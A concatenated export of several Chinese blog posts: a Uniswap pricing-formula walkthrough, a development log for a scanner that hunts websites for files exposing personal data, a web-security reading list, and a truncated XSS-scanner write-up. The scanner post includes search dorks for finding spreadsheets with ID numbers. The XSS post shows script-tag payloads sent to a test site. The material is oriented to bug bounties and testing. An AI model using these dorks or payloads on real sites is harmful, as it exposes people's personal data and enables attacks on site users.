<p>查了一些有关uniswap源码解析的文章，找到这篇<a href="https://medium.com/taipei-ethereum-meetup/uniswap-explanation-constant-product-market-maker-model-in-vyper-dff80b8467a1">Uniswap 解析：恆定乘積做市商模型 Constant Product Market Maker Model 的 Vyper 實作</a>里面讲得非常清楚，涉及到一些数学公式的推导，自己推导一遍，之后再去看uniswap的代码会清晰很多。</p>
<h1>恒定乘积公式</h1>
<h2 id="无手续费">无手续费:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x * y = k</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>令交易的两虚拟货币为 X 和 Y，各自数量为 x 和 y</p>
</li>
<li class="lvl-2">
<p>两货币数量的乘积 x * y 恆等于 k</p>
</li>
<li class="lvl-2">
<p>k 值是由第一笔注入的流动性所决定</p>
</li>
</ul>
<p>因此，用<code>∆x</code>数量的<code>X</code>币来购买<code>Y</code>币所能得到的数量<code>∆y</code>、或是为了购买<code>∆y</code>需要付出的<code>∆x</code>数量</p>
<p>依照此公式进行计算：<code>(x+∆x)(y-∆y) = k</code>，而交易的价格就是两币量 <code>∆x</code> 和 <code>∆y</code> 的比。</p>
<p>以下公式用 <code>α = ∆x / x</code> 和 <code>β = ∆y / y</code> 来表示 <code>∆x</code> 和 <code>∆y</code> 及 <code>X</code> <code>Y</code> 两币在交易发生后的新均衡数量：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133127.png" alt="20220219133127" /></p>
<p>公式推导:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219131154.png" alt="20220219131154" /></p>
<p>这样可以推导出前2行</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132237.png" alt="20220219132237" /></p>
<p>接着推导<code>∆x</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132331.png" alt="20220219132331" /></p>
<p>推导<code>∆y</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132509.png" alt="20220219132509" /></p>
<p>第一个图里的公式，都推导完了。</p>
<h2 id="计入手续费">计入手续费:</h2>
<p>在 Uniswap 进行的每一笔交易都会被收取 <code>ρ = 0.003 / 0.3%</code> 的手续费回馈给流动性提供者liquidity provider，因此要将手续费纳入公式的考量：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219132744.png" alt="20220219132744" /></p>
<p>文里作者推荐从 <code>∆x</code> 和 <code>∆y</code> 两值开始去推导</p>
<p>手续费 ρ = 0.3% 的意思是会从付款中扣掉 0.3 %，也就是从<code>∆x</code>扣。</p>
<p>在有手续费的情况下 <code>∆x</code> 就变成了 <code>(1-ρ)∆x</code> ，若令 <code>γ = 1-ρ</code> 则为 <code>γ∆x</code>。因此，将图一中的 <code>∆x</code> 换成 <code>γ∆x</code>，就会得到以下式子：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133241.png" alt="20220219133241" /></p>
<p>将等号左方的 <code>γ</code> 移到右方后就得到了图二中的 <code>∆x</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133820.png" alt="20220219133820" /></p>
<p>接着推导<code>∆y</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219133922.png" alt="20220219133922" /></p>
<p>而 <code>x’</code> 还有 <code>y’</code> 就可以由 <code>∆x</code> 和 <code>∆y</code> 推出来</p>
<p>推导<code>x’</code> ：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219134244.png" alt="20220219134244" /></p>
<p>推导<code>y’</code> ：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219135742.png" alt="20220219135742" /></p>
<p>将图二中得到的 x’ 和 y’ 相乘，会得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219135907.png" alt="20220219135907" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219140837.png" alt="20220219140837" /></p>
<p>当有手续费使得<code>γ != 1</code>或<code>ρ != 0</code>，<code>x’ρ * y’ρ</code> 的值其实会稍微和 <code>xy = k</code> 不同</p>
<p>实际上 <code>γ = 0.997</code> 或 <code>ρ = 0.003</code>，因此 1除以0.997-1 =&gt; <code>1/γ-1 ≒ 0.003</code>。</p>
<p><code>β = ∆y / y</code> 代表的是换得的 Y 币佔总量的比例，即使最大值为1(全部兑换出来)，误差也只有 1 * 0.003，故可知手续费 = 0.3% 对于 k 值的影响极小。</p>
<h2 id="相关代码">相关代码:</h2>
<p>给定<code>∆x</code>能购买多少<code>∆y</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @dev 获取的单个输出数额</span></span><br><span class="line"><span class="comment">// @notice 给定一项资产的输入量和配对的储备，返回另一项资产的最大输出量</span></span><br><span class="line"><span class="comment">// @param amountIn 输入数额</span></span><br><span class="line"><span class="comment">// @param reserveIn 储备量In</span></span><br><span class="line"><span class="comment">// @param reserveOut 储备量Out</span></span><br><span class="line"><span class="comment">// @return amountOut 输出数额</span></span><br><span class="line"><span class="comment">// given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAmountOut</span>(<span class="params">uint amountIn, uint reserveIn, uint reserveOut</span>) internal pure returns (uint amountOut) &#123;</span><br><span class="line">	<span class="comment">// 确认输入数额大于0</span></span><br><span class="line">	<span class="built_in">require</span>(amountIn &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;</span>);</span><br><span class="line">	<span class="comment">// 确认储备量In和储备量Out大于0</span></span><br><span class="line">	<span class="built_in">require</span>(reserveIn &gt; <span class="number">0</span> &amp;&amp; reserveOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;</span>);</span><br><span class="line">	<span class="comment">// 税后输入数额 = 输入数额 * 997</span></span><br><span class="line">	uint amountInWithFee = amountIn.<span class="title function_">mul</span>(<span class="number">997</span>);</span><br><span class="line">	<span class="comment">// 分子 = 税后输入数额 * 储备量Out</span></span><br><span class="line">	uint numerator = amountInWithFee.<span class="title function_">mul</span>(reserveOut);</span><br><span class="line">	<span class="comment">// 分母 = 储备量In * 1000 + 税后输入数额</span></span><br><span class="line">	uint denominator = reserveIn.<span class="title function_">mul</span>(<span class="number">1000</span>).<span class="title function_">add</span>(amountInWithFee);</span><br><span class="line">	<span class="comment">// 输出数额 = 分子 / 分母</span></span><br><span class="line">	amountOut = numerator / denominator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面已知</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219141804.png" alt="20220219141804" /></p>
<p>代码和公式表达方式不同，因此先将 <code>α = ∆x / x</code> 和 <code>β = ∆y / y</code> 代换回来并将上下同乘 <code>x</code>：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142103.png" alt="20220219142103" /></p>
<p>由于 <code>γ = 0.997</code>，可以将上下同乘 1000 后得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142135.png" alt="20220219142135" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142216.png" alt="20220219142216" /></p>
<p>将代码和公式结合起来：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219143438.png" alt="20220219143438" /></p>
<p>getAmountOut函数，通过入参：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>amountIn —— ∆x —— ∆x数量的x币</p>
</li>
<li class="lvl-2">
<p>reserveIn —— x —— x币的储备量/池子原有的x币数量</p>
</li>
<li class="lvl-2">
<p>reserveOut —— y —— y币的储备量</p>
</li>
</ul>
<p>计算出参:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>amountOut —— ∆y —— ∆y数量的y币</p>
</li>
</ul>
<p>指定的<code>∆y</code>需要多少<code>∆x</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @dev 获取的单个输入数额</span></span><br><span class="line"><span class="comment">// @notice 给定一项资产的输出量和配对的储备，返回其他资产的所需输入量</span></span><br><span class="line"><span class="comment">// @param amountOut 输出数额</span></span><br><span class="line"><span class="comment">// @param reserveIn 储备量In</span></span><br><span class="line"><span class="comment">// @param reserveOut 储备量Out</span></span><br><span class="line"><span class="comment">// @return amountIn 输入数额</span></span><br><span class="line"><span class="comment">// given an output amount of an asset and pair reserves, returns a required input amount of the other asset</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAmountIn</span>(<span class="params">uint amountOut, uint reserveIn, uint reserveOut</span>) internal pure returns (uint amountIn) &#123;</span><br><span class="line">	<span class="comment">// 确认输出数额大于0</span></span><br><span class="line">	<span class="built_in">require</span>(amountOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span>);</span><br><span class="line">	<span class="comment">// 确认储备量In和储备量Out大于0</span></span><br><span class="line">	<span class="built_in">require</span>(reserveIn &gt; <span class="number">0</span> &amp;&amp; reserveOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;</span>);</span><br><span class="line">	<span class="comment">// 分子 = 储备量In * 储备量Out * 1000</span></span><br><span class="line">	uint numerator = reserveIn.<span class="title function_">mul</span>(amountOut).<span class="title function_">mul</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">// 分母 = 储备量Out - 输出数额 * 997</span></span><br><span class="line">	uint denominator = reserveOut.<span class="title function_">sub</span>(amountOut).<span class="title function_">mul</span>(<span class="number">997</span>);</span><br><span class="line">	<span class="comment">// 输入数额 = ( 分子 / 分母 ) + 1</span></span><br><span class="line">	amountIn = (numerator / denominator).<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一样先将 <code>α = ∆x / x</code> 、<code>β = ∆y / y</code> 和 <code>γ = 0.997</code> 代换并上下同乘 <code>1000y</code> 得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219152828.png" alt="20220219152828" /></p>
<p>将代码和公式结合起来：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219153330.png" alt="20220219153330" /></p>
<p>getAmountIn函数，通过入参：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>amountOut —— ∆y —— ∆y数量的y币</p>
</li>
<li class="lvl-2">
<p>reserveIn —— x —— x币的储备量/池子原有的x币数量</p>
</li>
<li class="lvl-2">
<p>reserveOut —— y —— y币的储备量</p>
</li>
</ul>
<p>计算出参:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>amountIn —— ∆x —— ∆x数量的x币</p>
</li>
</ul>
<p>最后有个+1，因为<code>solidity</code>在进行整数除法的时候，余数部分是会被抛弃掉的，相当于向下取整。<br />
+1之后，交易者需要付出多一点点</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://medium.com/taipei-ethereum-meetup/uniswap-explanation-constant-product-market-maker-model-in-vyper-dff80b8467a1">Uniswap 解析：恆定乘積做市商模型 Constant Product Market Maker Model 的 Vyper 實作</a></p>
</li>
<li class="lvl-2">
<p><a href="https://juejin.cn/post/6881428134382534663#heading-4">OneSwap系列三之 Solidity当中的算术运算</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
        <tag>Uniswap</tag>
      </tags>
  </entry>
  <entry>
    <title>WPSIH-网站个人敏感信息文件扫描器-开发记录</title>
    <url>/2019/64851.html</url>
    <content><![CDATA[<h1>项目名:WPSIH</h1>
<p>Website Sensitive Personal Information Hunter-网站个人敏感信息文件扫描器</p>
<p><img src="https://i.loli.net/2019/04/28/5cc5b3a24036a.png" alt="" /></p>
<p>项目地址:<a href="https://github.com/jerrychan807/WSPIH">WSPIH</a></p>
<hr />
<h1>运行效果:</h1>
<p><img src="https://i.loli.net/2019/04/30/5cc72451486a1.png" alt="" /></p>
<hr />
<h1>程序执行逻辑:</h1>
<p><img src="https://i.loli.net/2019/04/29/5cc71ada6c08d.png" alt="" /></p>
<hr />
<h2 id="爬取链接">爬取链接:</h2>
<p>需要过滤掉一些无用的后缀名:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IGNORED_EXTESIONS = [&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;jpeg&quot;, &quot;woff&quot;, &quot;ttf&quot;, &quot;eot&quot;, &quot;svg&quot;, &quot;woff2&quot;, &quot;ico&quot;]</span><br></pre></td></tr></table></figure>
<p>并筛选出需要的后缀名,然后保存下来:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXCEL_EXTENSIONS = [&quot;xls&quot;, &quot;xlsx&quot;]</span><br><span class="line">PDF_EXTENSIONS = [&quot;pdf&quot;]</span><br><span class="line">WORD_EXTENSIONS = [&quot;doc&quot;, &quot;docx&quot;]</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="解析文本内容">解析文本内容:</h2>
<p>ExcelParser:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>xlrd</code>模块</p>
</li>
</ul>
<p>PdfParser：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>pdfminer</code>模块</p>
</li>
<li class="lvl-2">
<p>无法检测图片中是否存在敏感信息；</p>
</li>
</ul>
<p>WordParser:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>python-docx</code>模块</p>
</li>
<li class="lvl-2">
<p>无法检测图片中是否存在敏感信息；</p>
</li>
<li class="lvl-2">
<p>只支持.docx</p>
</li>
</ul>
<blockquote>
<p><code>doc</code>后缀的,需要在wins环境下转换成<code>docx</code>后缀,然后才能解析.遂放弃.</p>
</blockquote>
<hr />
<h2 id="基于正则匹配敏感信息">基于正则匹配敏感信息</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHONE_REGEX = r&#x27;^(?:\+?86)?1(?:3\d&#123;3&#125;|5[^4\D]\d&#123;2&#125;|8\d&#123;3&#125;|7(?:[35678]\d&#123;2&#125;|4(?:0\d|1[0-2]|9\d))|9[189]\d&#123;2&#125;|66\d&#123;2&#125;)\d&#123;6&#125;$&#x27;</span><br><span class="line"></span><br><span class="line">EMAIL_REGEX = r&#x27;^\w+@(\w+\.)+\w+&#x27;</span><br><span class="line"></span><br><span class="line">IDCARD_REGEX = r&#x27;^[1-9]\d&#123;5&#125;(18|19|20)\d&#123;2&#125;((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d&#123;3&#125;[0-9Xx]&#x27;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>手机号码的正则一开始没在后面加上<code>$</code>符号(<code>$</code>是正则表达式匹配字符串结束位置),因为一开始在简单测试excel里的手机号码的时候,发现有这种情况:<code>13424324567.0</code>,所以唐突的把<code>$</code>去掉了.</p>
<p>这种就是没有经过大量测试的后果.</p>
<p>导致产生了很多误报. 可见正则大法好,但是要<strong>深刻理解和正确使用</strong>.不然误报太多了.</p>
</blockquote>
<hr />
<h1>一些有趣的点:</h1>
<h2 id="隐藏起来的敏感信息">隐藏起来的敏感信息:</h2>
<p>有些文件是能匹配出敏感结果的,但是实际上你去打开那个文件,你会找不到结果.举例如下:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>excel的隐藏列:</p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/04/29/5cc71c1146490.png" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>excel的折叠列:</p>
</li>
</ul>
<p>拉开前:</p>
<p><img src="https://i.loli.net/2019/04/30/5cc736e3b72a8.png" alt="" /></p>
<p>看图上的绿色线,是把内容折叠了起来</p>
<p>实际上把绿色线拉开之后,确实是存在敏感信息的.</p>
<p><img src="https://i.loli.net/2019/04/30/5cc736f97350d.png" alt="" /></p>
<hr />
<h2 id="在书里找到了敏感信息">在书里找到了敏感信息:</h2>
<p>在一本书里,匹配到了邮箱…估计是作者、出版社的联系方式…</p>
<p><img src="https://i.loli.net/2019/04/30/5cc721bf2ce18.jpg" alt="" /></p>
<p>尴尬…</p>
<hr />
<h1>问题:</h1>
<h2 id="已解决的Bug">已解决的Bug:</h2>
<h3 id="把命令写死了">把命令写死了:</h3>
<p><img src="https://i.loli.net/2019/04/30/5cc7233328377.png" alt="" /></p>
<blockquote>
<p>不同环境下的python执行路径是不同的…</p>
</blockquote>
<hr />
<h3 id="跨平台运行的问题">跨平台运行的问题:</h3>
<p>比如wins下没有<code>find</code>命令,要用<code>for</code></p>
<blockquote>
<p>跨平台运行是个令人头疼的问题呀…会有很多意想不到的结果出现.</p>
</blockquote>
<hr />
<h3 id="减少模板类文件的误报">减少模板类文件的误报:</h3>
<p>如模板类,解决办法: 通过数量判定,例如从某个文件收集到的邮箱少于2个.则认为这是个模板类文件.</p>
<p>举例:</p>
<p><img src="https://i.loli.net/2019/04/28/5cc5c4a676f30.png" alt="" /><br />
<img src="https://i.loli.net/2019/04/28/5cc5c5113bb70.png" alt="" /></p>
<hr />
<h1>待改进的地方:</h1>
<hr />
<h2 id="更多的正则匹配">更多的正则匹配:</h2>
<p>for Chinese:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>支付宝账号</p>
</li>
<li class="lvl-2">
<p>社保账号</p>
</li>
<li class="lvl-2">
<p>银行卡号</p>
</li>
<li class="lvl-2">
<p>身份证</p>
</li>
<li class="lvl-2">
<p>护照</p>
</li>
<li class="lvl-2">
<p>香港永久性居民身份证</p>
</li>
<li class="lvl-2">
<p>澳门永久性居民身份证</p>
</li>
<li class="lvl-2">
<p>台湾居民来往大陆通行证</p>
</li>
<li class="lvl-2">
<p>军官证</p>
</li>
</ul>
<p>for Foreign:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>外国手机号</p>
</li>
<li class="lvl-2">
<p>外国身份证号码</p>
</li>
</ul>
<blockquote>
<p>估计也没时间去完善hhh</p>
</blockquote>
<hr />
<h2 id="基于关键字匹配">基于关键字匹配:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>身份证</p>
</li>
<li class="lvl-2">
<p>身份证号</p>
</li>
<li class="lvl-2">
<p>身份证号码</p>
</li>
<li class="lvl-2">
<p>身份证件号码</p>
</li>
<li class="lvl-2">
<p>证件号码</p>
</li>
<li class="lvl-2">
<p>zjhm</p>
</li>
<li class="lvl-2">
<p>证件类型</p>
</li>
<li class="lvl-2">
<p>证书号码</p>
</li>
<li class="lvl-2">
<p>手机</p>
</li>
<li class="lvl-2">
<p>联系电话</p>
</li>
<li class="lvl-2">
<p>联系方式</p>
</li>
<li class="lvl-2">
<p>电子邮箱</p>
</li>
<li class="lvl-2">
<p>dzly</p>
</li>
<li class="lvl-2">
<p>通信地址</p>
</li>
<li class="lvl-2">
<p>家庭地址</p>
</li>
</ul>
<blockquote>
<p>预期使用关键词匹配的话,误报会很多,只适用于excel类型的表头.</p>
</blockquote>
<hr />
<h2 id="动态链接下载">动态链接下载:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>http://yjsy.uibe.edu.cn/common/downloadFile.jsp?id=119295</code></p>
</li>
<li class="lvl-2">
<p><code>http://yz.nwafu.edu.cn/common/rtfeditor/openfile.jsp?id=DBCPDBDDDFDIDBCPDADBDGCOHIGMHD</code></p>
</li>
</ul>
<p>类似以上这种url,要访问动态链接,服务器才会返回文件的url地址.</p>
<p>目前是处理不了这种情况.</p>
<blockquote>
<p>搜索引擎是可以爬取到这类url的文件的预计解决办法是:1.要用上无头浏览器等技术.模拟发包是不行的 2.直接访问该url并下载文件.</p>
</blockquote>
<hr />
<h1>其他:</h1>
<hr />
<h2 id="测试服务器">测试服务器:</h2>
<p><img src="https://i.loli.net/2019/04/30/5cc732ed512d9.jpg" alt="" /></p>
<p>跑到机子模糊…</p>
<p><img src="https://i.loli.net/2019/04/30/5cc7330875dcd.jpg" alt="" /></p>
<hr />
<h2 id="搜索引擎hack">搜索引擎hack:</h2>
<p>百度:</p>
<p><code>site:*.edu.cn filetype:xls</code><br />
<code>site:*.edu.cn filetype:xls 身份证</code></p>
<p>google:</p>
<p><code>site:*.edu.cn filetype:xls</code></p>
<blockquote>
<p>主要是用于前期寻找测试文件</p>
</blockquote>
<hr />
<h2 id="注意点">注意点:</h2>
<p>我已知的,目前<code>edu-src</code>判定是敏感文件的范围是:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>个人手机</p>
</li>
<li class="lvl-2">
<p>个人住址</p>
</li>
<li class="lvl-2">
<p><s>个人邮箱</s> (目前不收了)</p>
</li>
<li class="lvl-2">
<p><strong>身份证</strong></p>
</li>
</ul>
<p>不属于的范围:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>工作邮箱</p>
</li>
<li class="lvl-2">
<p>准考证号</p>
</li>
</ul>
<blockquote>
<p>知道规则也很重要…hhh</p>
</blockquote>
<hr />
<h2 id="修复方案">修复方案:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>作为信息公示的话,身份证显示后六位或者打码显示即可</p>
</li>
<li class="lvl-2">
<p>如无必要,不要上传到公网上.</p>
</li>
</ul>
<hr />
<h1>Contributors:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>JackChan1024</p>
</li>
</ul>
<blockquote>
<p>hacking together , is so cool…</p>
</blockquote>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://jingyan.baidu.com/article/148a192191dc9a4d71c3b11c.html">excel中如何隐藏列和取消隐藏列</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/tijme/not-your-average-web-crawler">not-your-average-web-crawler</a> 这是个很棒的爬虫框架.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSecurity Learning lib</title>
    <url>/2019/39913.html</url>
    <content><![CDATA[<p><a href="https://www.kanxue.com/chm.htm">看雪知识库</a><a href="blog.nsfocus.net/web-vulnerability-analysis-coding-security/">【干货分享】Web安全漏洞深入分析及其安全编码</a></p>
<hr />
<h2 id="xss">xss:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84593067">XSStrike源码阅读（1）——目录结构与大体架构</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84660755">XSStrike源码阅读（2）——四种模式</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84886282">XSStrike源码阅读（3）——核心函数</a></p>
</li>
</ul>
<hr />
<h2 id="sqli">sqli:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.slideshare.net/stamparm/presentations">sqlmap作者ppt合集</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/wn314/article/details/78872828">Sqlmap中文手册</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.cnblogs.com/hongfei/p/3872156.html">SQLMap用户手册【超详细】</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/43242220">sqlmap 内核分析 I: 基础流程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/44157153">sqlmap 内核分析 II: 核心原理-页面相似度算法实践</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/45291193">sqlmap 内核分析 III: 核心逻辑</a></p>
</li>
<li class="lvl-2">
<p><a href="https://x.hacking8.com/post-303.html">sqlmap 1.0源码解析</a></p>
</li>
<li class="lvl-2">
<p><a href="https://wooyun.js.org/drops/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90Part1.%E6%B5%81%E7%A8%8B%E7%AF%87.html">SQLMAP源码分析Part1.流程篇</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/zylq-blog/p/6797237.html">SQLMAP自动注入（二）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://wps2015.org/drops/drops/sqlmap%E6%94%AF%E6%8C%81%E8%87%AA%E5%8A%A8%E4%BC%AA%E9%9D%99%E6%80%81%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B.html">sqlmap支持自动伪静态批量检测</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.wupco.cn/?p=1437">SQLMAP|阅读手记三{“三测”、开始注入}</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/u010516151/article/details/101905722">数据库注入方法和绕过技巧</a></p>
</li>
</ul>
<hr />
<h2 id="port-scan">port scan:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://cloud.tencent.com/developer/article/1180313">nmap使用指南（终极版）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/anvol/micro-honeypot/blob/master/honeypotd.c">micro-honeypot</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/joeyism/C-Port-Scanner/blob/e5f6d414b8c9ece197e1f2941c041941d44458df/portscanner.c">C-Port-Scanner</a></p>
</li>
</ul>
<hr />
<h2 id="爆破">爆破:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.51cto.com/jzking121/1770605">Hydra使用说明——爆破神器</a></p>
</li>
</ul>
<hr />
<h2 id="Scanner">Scanner:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://chybeta.github.io/2019/01/04/WAScan%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">WAScan源码阅读</a></p>
</li>
</ul>
<hr />
<h2 id="日志分析">日志分析:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://mp.weixin.qq.com/s/FzF0sx2geStPIc5VbskoGQ">日志分析系列(一):介绍篇</a></p>
</li>
<li class="lvl-2">
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904160&amp;idx=1&amp;sn=652e2bc0924230fbefc6fde80f64775f&amp;scene=21#wechat_redirect">Web日志安全分析技巧</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>XSScon源码-Simple XSS Scanner tool</title>
    <url>/2019/28684.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>同事在用<a href="https://github.com/menkrep1337/XSSCon">XSSCon</a>来测试xss漏洞,然后发现run不起来,然后我帮它debug了一下,顺手提了pr.</p>
<p>我稍微瞄了一下这个工具的xss scanner的代码,发现精简得很,所以看一看它源码.</p>
<hr />
<h1>检测效果:</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__  ______ ____   ____</span><br><span class="line">\ \/ / ___/ ___| / ___|___  _ __</span><br><span class="line"> \  /\___ \___ \| |   / _ \| &#x27;_ \ &#123;v0.5 Final&#125;</span><br><span class="line"> /  \ ___) |__) | |__| (_) | | | | https://github.com/menkrep1337/XSSCon</span><br><span class="line">/_/\_\____/____/ \____\___/|_| |_|</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line"></span><br><span class="line">[16:20:31] [INFO] Starting XSSCon...</span><br><span class="line">***************</span><br><span class="line">[16:20:31] [INFO] Checking connection to: http://testphp.vulnweb.com</span><br><span class="line">[16:20:32] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:32] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:32] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:32] [INFO] Form key name: searchFor value: &lt;script&gt;console.log(5000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:32] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:32] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:33] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:33] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;console.log(5000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">***************</span><br><span class="line">[16:20:34] [INFO] Checking connection to: http://testphp.vulnweb.com/index.php</span><br><span class="line">[16:20:36] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:36] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:36] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:36] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:36] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:36] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:37] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:37] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">***************</span><br><span 